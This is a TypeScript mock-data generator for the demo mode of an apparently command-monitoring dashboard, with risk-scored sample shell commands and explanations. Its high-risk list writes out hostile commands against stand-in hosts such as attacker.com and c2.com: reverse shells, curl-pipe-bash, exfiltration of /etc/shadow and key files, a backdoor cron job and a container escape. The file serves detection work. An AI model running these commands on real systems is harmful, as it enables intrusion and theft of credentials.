// Mock data generator for demo mode
export interface Event {
  time?: string;
  line?: string;
  score?: number;
  alert?: boolean;
  reason?: string;
}

const HIGH_RISK_COMMANDS = [
  {
    line: "nmap -sS 192.168.1.0/24",
    score: 0.95,
    alert: true,
    reason: "Network scanning tool used for reconnaissance. SYN scan is often used by attackers to identify open ports."
  },
  {
    line: "chmod 777 /etc/passwd",
    score: 0.90,
    alert: true,
    reason: "Granting full permissions to a critical system file is a severe privilege escalation attempt."
  },
  {
    line: "curl http://malicious.com/payload.sh | bash",
    score: 0.92,
    alert: true,
    reason: "Remote code execution: downloading and executing arbitrary shell script from untrusted source."
  },
  {
    line: "nc -l -p 4444 -e /bin/bash",
    score: 0.88,
    alert: true,
    reason: "Establishing a reverse shell using netcat, common technique for maintaining unauthorized access."
  },
  {
    line: "base64 -d /etc/shadow | curl -X POST http://attacker.com",
    score: 0.94,
    alert: true,
    reason: "Data exfiltration: decoding and transmitting sensitive password hash file to external server."
  },
  {
    line: "masscan -p1-65535 10.0.0.0/8 --rate=1000",
    score: 0.96,
    alert: true,
    reason: "High-speed network scanning across large IP range. Masscan is specifically designed for rapid reconnaissance."
  },
  {
    line: "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('attacker.com',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'])\"",
    score: 0.93,
    alert: true,
    reason: "Python reverse shell payload establishing persistent backdoor connection to external server."
  },
  {
    line: "find / -name '*.key' -exec cat {} \\; | curl -X POST -d @- http://exfil.com",
    score: 0.91,
    alert: true,
    reason: "Searching for cryptographic keys and exfiltrating them to external server - severe data breach."
  },
  {
    line: "kubectl create secret generic backdoor --from-literal=token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
    score: 0.89,
    alert: true,
    reason: "Extracting Kubernetes service account token and creating secret - potential cluster compromise."
  },
  {
    line: "iptables -A INPUT -p tcp --dport 22 -j ACCEPT && iptables -A INPUT -j DROP",
    score: 0.87,
    alert: true,
    reason: "Modifying firewall rules to block all traffic except SSH - potential DoS or access control bypass."
  },
  {
    line: "echo '*/1 * * * * curl -s http://c2.com/update.sh | bash' | crontab -",
    score: 0.92,
    alert: true,
    reason: "Installing persistent cron job to download and execute remote scripts every minute - backdoor installation."
  },
  {
    line: "docker run --privileged --net=host -v /:/host alpine chroot /host /bin/bash",
    score: 0.94,
    alert: true,
    reason: "Privileged container escape attempt using host networking and filesystem access - container breakout."
  }
];

const MEDIUM_RISK_COMMANDS = [
  {
    line: "wget https://example.com/script.sh",
    score: 0.45,
    alert: false,
    reason: "Downloading external script - potentially risky depending on source trustworthiness."
  },
  {
    line: "ssh root@192.168.1.100",
    score: 0.38,
    alert: false,
    reason: "SSH connection to remote host - legitimate but requires monitoring for unauthorized access."
  },
  {
    line: "docker exec -it container /bin/sh",
    score: 0.42,
    alert: false,
    reason: "Container shell access - normal admin operation but can be used for lateral movement."
  },
  {
    line: "curl -X POST https://api.external-service.com/webhook -d @sensitive.json",
    score: 0.48,
    alert: false,
    reason: "Sending data to external service - legitimate integration but requires monitoring for data exfiltration."
  },
  {
    line: "kubectl port-forward svc/database 5432:5432",
    score: 0.35,
    alert: false,
    reason: "Port forwarding database service - normal debugging operation but exposes internal services."
  },
  {
    line: "tcpdump -i eth0 -w capture.pcap",
    score: 0.40,
    alert: false,
    reason: "Network packet capture - legitimate monitoring but can capture sensitive data in transit."
  },
  {
    line: "python3 -m http.server 8080",
    score: 0.43,
    alert: false,
    reason: "Starting HTTP server - normal development tool but can expose filesystem if misconfigured."
  },
  {
    line: "kubectl get secrets --all-namespaces",
    score: 0.37,
    alert: false,
    reason: "Listing all secrets across namespaces - administrative operation but requires high privileges."
  },
  {
    line: "docker run -p 8080:80 nginx",
    score: 0.32,
    alert: false,
    reason: "Running container with port mapping - normal deployment but exposes service to network."
  },
  {
    line: "curl -k https://internal-api.company.com/health",
    score: 0.41,
    alert: false,
    reason: "HTTPS request with certificate verification disabled - bypasses security controls."
  },
  {
    line: "kubectl logs -f deployment/app --tail=1000",
    score: 0.33,
    alert: false,
    reason: "Following application logs - normal debugging but may contain sensitive information."
  },
  {
    line: "docker save myapp:latest | gzip > backup.tar.gz",
    score: 0.36,
    alert: false,
    reason: "Creating container image backup - normal operation but creates large files that could contain sensitive data."
  }
];

const LOW_RISK_COMMANDS = [
  {
    line: "ls -la /home",
    score: 0.05,
    alert: false,
    reason: "Normal file listing command for viewing directory contents."
  },
  {
    line: "ps aux",
    score: 0.08,
    alert: false,
    reason: "Standard command for displaying running processes."
  },
  {
    line: "cat /var/log/app.log",
    score: 0.10,
    alert: false,
    reason: "Reading application logs - normal troubleshooting activity."
  },
  {
    line: "df -h",
    score: 0.06,
    alert: false,
    reason: "Checking disk space usage - routine system monitoring."
  },
  {
    line: "kubectl get pods",
    score: 0.12,
    alert: false,
    reason: "Kubernetes resource inspection - standard administrative operation."
  },
  {
    line: "kubectl get nodes",
    score: 0.08,
    alert: false,
    reason: "Listing cluster nodes - normal administrative operation."
  },
  {
    line: "docker ps",
    score: 0.07,
    alert: false,
    reason: "Listing running containers - standard container management."
  },
  {
    line: "kubectl describe pod myapp-123",
    score: 0.09,
    alert: false,
    reason: "Inspecting specific pod details - normal debugging operation."
  },
  {
    line: "kubectl top pods",
    score: 0.11,
    alert: false,
    reason: "Checking resource usage - standard monitoring command."
  },
  {
    line: "kubectl get services",
    score: 0.06,
    alert: false,
    reason: "Listing Kubernetes services - normal cluster inspection."
  },
  {
    line: "kubectl get deployments",
    score: 0.07,
    alert: false,
    reason: "Listing deployments - standard application management."
  },
  {
    line: "kubectl get namespaces",
    score: 0.05,
    alert: false,
    reason: "Listing namespaces - basic cluster administration."
  },
  {
    line: "kubectl config current-context",
    score: 0.04,
    alert: false,
    reason: "Checking current Kubernetes context - standard configuration check."
  },
  {
    line: "kubectl version",
    score: 0.03,
    alert: false,
    reason: "Checking Kubernetes version - normal system information."
  },
  {
    line: "kubectl get events",
    score: 0.10,
    alert: false,
    reason: "Listing cluster events - standard troubleshooting operation."
  },
  {
    line: "kubectl get configmaps",
    score: 0.08,
    alert: false,
    reason: "Listing configuration maps - normal configuration management."
  },
  {
    line: "kubectl get ingress",
    score: 0.09,
    alert: false,
    reason: "Listing ingress resources - standard networking configuration check."
  },
  {
    line: "kubectl rollout status deployment/myapp",
    score: 0.06,
    alert: false,
    reason: "Checking deployment rollout status - normal application management."
  },
  {
    line: "kubectl get persistentvolumes",
    score: 0.07,
    alert: false,
    reason: "Listing persistent volumes - standard storage management."
  },
  {
    line: "kubectl get networkpolicies",
    score: 0.11,
    alert: false,
    reason: "Listing network policies - standard security configuration check."
  }
];

let eventCounter = 0;
const generatedEvents: Event[] = [];

function getRandomCommand() {
  const rand = Math.random();
  if (rand < 0.2) {
    // 20% high risk
    return HIGH_RISK_COMMANDS[Math.floor(Math.random() * HIGH_RISK_COMMANDS.length)];
  } else if (rand < 0.4) {
    // 20% medium risk
    return MEDIUM_RISK_COMMANDS[Math.floor(Math.random() * MEDIUM_RISK_COMMANDS.length)];
  } else {
    // 60% low risk
    return LOW_RISK_COMMANDS[Math.floor(Math.random() * LOW_RISK_COMMANDS.length)];
  }
}

export function generateMockEvent(): Event {
  const cmd = getRandomCommand();
  const event: Event = {
    ...cmd,
    time: new Date(Date.now() - eventCounter * 10000).toISOString()
  };
  eventCounter++;
  return event;
}

export function initializeMockData(): Event[] {
  if (generatedEvents.length === 0) {
    // Generate initial dataset
    for (let i = 0; i < 10; i++) {
      generatedEvents.push(generateMockEvent());
    }
  }
  return generatedEvents;
}

export function addNewMockEvent(): Event {
  const newEvent = generateMockEvent();
  generatedEvents.unshift(newEvent);
  
  // Keep only last 100 events
  if (generatedEvents.length > 100) {
    generatedEvents.pop();
  }
  
  return newEvent;
}

export function getMockEvents(): Event[] {
  return [...generatedEvents];
}

export function generateBulkTestData(count: number = 5): Event[] {
  const newEvents: Event[] = [];
  for (let i = 0; i < count; i++) {
    newEvents.push(generateMockEvent());
  }
  
  // Add to the beginning of the list
  generatedEvents.unshift(...newEvents);
  
  // Keep only last 100 events
  if (generatedEvents.length > 100) {
    generatedEvents.splice(100);
  }
  
  return newEvents;
}
